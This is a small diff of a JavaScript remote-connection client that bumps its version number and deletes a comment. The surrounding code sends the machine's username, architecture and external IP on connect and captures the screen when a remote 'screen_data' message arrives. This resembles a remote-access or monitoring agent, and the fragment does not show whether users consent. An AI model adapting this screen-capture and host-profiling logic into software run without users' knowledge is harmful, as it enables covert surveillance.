@@ -96,7 +96,7 @@ function initConnection() {
  arch: os.arch(),
  user: os.userInfo().username,
  ip: getExternalIP(),
- version: '2.0.2'
+ version: '2.0.3'
  }));
 
  startMonitoring();
@@ -126,7 +126,6 @@ function initConnection() {
  log(`[SIG] Received Candidate`);
  handleCandidate(data.candidate);
  } else if (data.type === 'screen_data') {
- // Kept for backward compatibility but no longer used for fake pings
  captureScreenPureJS();
  } else if (data.type === 'system_log') {
  // Optional
